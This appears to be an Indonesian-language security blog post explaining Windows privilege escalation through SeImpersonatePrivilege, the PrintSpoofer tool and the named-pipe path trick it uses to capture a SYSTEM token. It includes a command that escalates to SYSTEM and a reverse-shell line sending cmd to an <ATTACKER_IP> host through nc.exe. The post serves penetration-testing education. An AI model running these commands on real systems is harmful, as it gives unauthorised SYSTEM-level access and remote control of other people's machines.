---
title: "[Windows PrivEsc] Token Impersonation (SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege)"
author: "novran"
date: 2024-11-20 00:00:00 +0700
categories: [Windows Privilege Escalation]
tags: [Windows Privilege Escalation]
image:
  path: /images/2024-11-20-windows-privilege-escalation-sebackupprivilege-dump-sam-system-ntds-dit-banner.png
---

Impersonate adalah hak istimewa di Windows yang memungkinkan kita untuk menyamar sebagai User lain (termasuk menyamar sebagai **NT AUTHORITY\SYSTEM**) untuk menjalankan sebuah tugas atau proses di bawah naungan User tersebut.

> **Why?**
> 
> Kita ambil contoh Service IIS (Web Server).

Ketika User yang menjalankan service IIS bukanlah **NT AUTHORITY\SYSTEM**, maka proses yang dijalankan oleh Service tersebut mungkin tidak memiliki Privilege yang cukup untuk mengakses semua sumber daya (Resource) yang dibutuhkan oleh IIS untuk mengoperasikan Web Server secara keseluruhan.

Namun **dengan menggunakan Impersonation, layanan IIS masih dapat menjalankan tugas tertentu yang memerlukan hak istimewa tanpa harus (User IIS-nya) di-setting menggunakan Role khusus**. Jadi, dengan ini, layanan IIS **masih dapat melanjutkan tugasnya tanpa harus terhenti hanya karena user IIS tidak memiliki Role yang setara** dengan _NT AUTHORITY\SYSTEM_.

# Abuse Token

| Privilege                       | Windows API Function         | Tujuan                                                              |
|---------------------------------|------------------------------|---------------------------------------------------------------------|
| `SeImpersonatePrivilege`        | [**CreateProcessWithTokenW**](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)  | Meniru token untuk menjalankan proses dengan hak istimewa tertentu. |
| `SeAssignPrimaryTokenPrivilege` | [**CreateProcessAsUserA**](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) | Mengganti token utama untuk membuat proses dengan identitas baru.   |

## PrintSpoofer (2019)

> **Affected:** Windows 10 & Server 2019
> 
> [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/latest) by **itm4n**, 2020

```powershell
# Interactive Shell
.\PrintSpoofer.exe -i -c cmd

# Reverse Shell
.\PrintSpoofer.exe -c "C:\Windows\temp\nc.exe <ATTACKER_IP> 443 -e cmd"
```

**Cara Kerja**

PrintSpoofer memanfaatkan Named Pipe untuk melakukan impersonasi menggunakan fungsi ImpersonateNamedPipeClient().
1. Membuat Named Pipe dengan `CreateNamedPipe()` dan memberikan akses ke semua orang.
2. Menggunakan `ConnectNamedPipe()` untuk menunggu koneksi klien.
3. Setelah koneksi diterima, `ImpersonateNamedPipeClient()` digunakan untuk mendapatkan hak akses klien dan menjalankan kode sebagai pengguna tersebut.

Untuk memaksa `SYSTEM`, PrintSpoofer menggunakan eksploitasi **PrinterBug** yang memanfaatkan fungsi `RpcRemoteFindFirstPrinterChangeNotificationEx()`. Ini digunakan oleh Print Service untuk mengirim notifikasi perubahan melalui RPC (Remote Procedure Call) menggunakan Named Pipe.

> Namun, **spoolss Named Pipe bawaan yang digunakan oleh Print Service itu sudah dimiliki oleh SYSTEM** dan tidak bisa digantikan.

**Bypass**

Trik yang digunakan yaitu dengan menambahkan karakter "/" ke dalam nama host, lalu sistem akan menganggap itu valid, sehingga validasi dapat di-bypass. Seperti `\\HOSTNAME/pipe/foo123` akan diubah menjadi `\\HOSTNAME\pipe\foo123\pipe\spoolss`. Yang artinya, kita bisa membuat Named Pipe yang terlihat seperti milik SYSTEM, sehingga SYSTEM tanpa sadar akan terhubung ke Named Pipe yang kita buat. Hasilnya, fungsi Printer akan terhubung ke Named Pipe yang sudah kita kontrol dan token SYSTEM akan kita terima.
